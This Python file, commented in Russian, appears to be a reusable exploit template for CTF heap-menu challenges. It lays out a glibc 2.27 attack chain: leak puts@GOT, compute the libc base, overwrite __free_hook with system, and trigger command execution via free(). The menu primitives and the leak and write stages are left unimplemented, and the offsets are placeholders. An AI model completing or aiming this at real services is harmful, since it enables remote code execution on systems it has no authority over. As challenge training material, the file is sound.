#!/usr/bin/env python3
"""
heap_tcache_hook.py — обобщённый каркас эксплойта для heap-menu задач
(объекты `[name*][desc*][tag]`, `edit` переполняет desc, `inspect` читает
8 байт по desc). Реализует паттерн:
    leak: descB = puts@GOT → inspect → libc_base
    hook: descB = __free_hook → edit → записать system
    trig: remove A → free(descA) = system(CMD)

Заполняется под конкретную задачу (адреса/смещения O'ffsets из листинга).
Без привязки к площадке; CMD передаётся параметром (≤63 байт).
"""

import socket
import time
import struct

OFFSETS = {
    "PUTS": 0x000000000008_000,      # TODO: подставить (libc 2.27)
    "SYSTEM": 0x000000000004f440,     # TODO: подставить
    "FREE_HOOK": 0x3ed8e8,           # TODO: подставить (libc 2.27)
    "GOT_PUTS": 0x602020,            # TODO: подставить (no PIE)
}


class HeapMenuExploit:
    def __init__(self, host, port, offsets=None, timeout=10):
        self.s = socket.create_connection((host, port), timeout=timeout)
        self.s.settimeout(timeout)
        self.buf = b""
        self.O = {**OFFSETS, **(offsets or {})}

    # --- транспорт ---
    def recv_until(self, marker, max_wait=8):
        deadline = time.time() + max_wait
        while marker not in self.buf:
            if time.time() > deadline:
                raise TimeoutError(f"no {marker!r}")
            chunk = self.s.recv(4096)
            if not chunk:
                raise ConnectionError("closed")
            self.buf += chunk
        idx = self.buf.index(marker) + len(marker)
        out, self.buf = self.buf[:idx], self.buf[idx:]
        return out

    def recv_all(self, wait=0.5):
        """Слить весь вывод команды (setblocking False + цикл)."""
        time.sleep(wait)
        self.s.setblocking(False)
        out = b""
        try:
            while True:
                ch = self.s.recv(4096)
                if not ch:
                    break
                out += ch
        except BlockingIOError:
            pass
        finally:
            self.s.setblocking(True)
        return out

    def send(self, data):
        self.s.sendall(data)

    # --- примитивы меню (переопределить под баннер конкретной задачи) ---
    def menu_add(self, name, desc, size):
        raise NotImplementedError

    def menu_edit(self, idx, payload):
        raise NotImplementedError

    def menu_inspect(self, idx):
        raise NotImplementedError

    def menu_remove(self, idx):
        raise NotImplementedError

    # --- стадии ---
    def leak_puts(self):
        """Переполнение descA → подмена descB=puts@GOT → inspect.
        Возвращает (leak_bytes, утечка_puts)."""
        raise NotImplementedError

    def write_free_hook_system(self):
        """Подмена descB=__free_hook → edit → system в hook.
        Readback: inspect должен вернуть 0-байт (system = 0 в младших)."""
        raise NotImplementedError

    def trigger(self, cmd):
        """remove A → free(descA)=system(cmd) → вернуть вывод."""
        self.menu_remove(0)
        return self.recv_all(1.0)

    def exploit_once(self, cmd):
        """Полный цикл: leak → hook → trigger с одной командой."""
        libc_base = self.leak_puts() - self.O["PUTS"]
        self.O["SYSTEM"] += libc_base
        self.O["FREE_HOOK"] += libc_base
        self.write_free_hook_system()
        return self.trigger(cmd)


if __name__ == "__main__":
    print("Подставьте адреса/смещения и реализуйте примитивы меню.")
    print("Пример вызова: exp = HeapMenuExploit(host, port); print(exp.exploit_once(b'id'))")
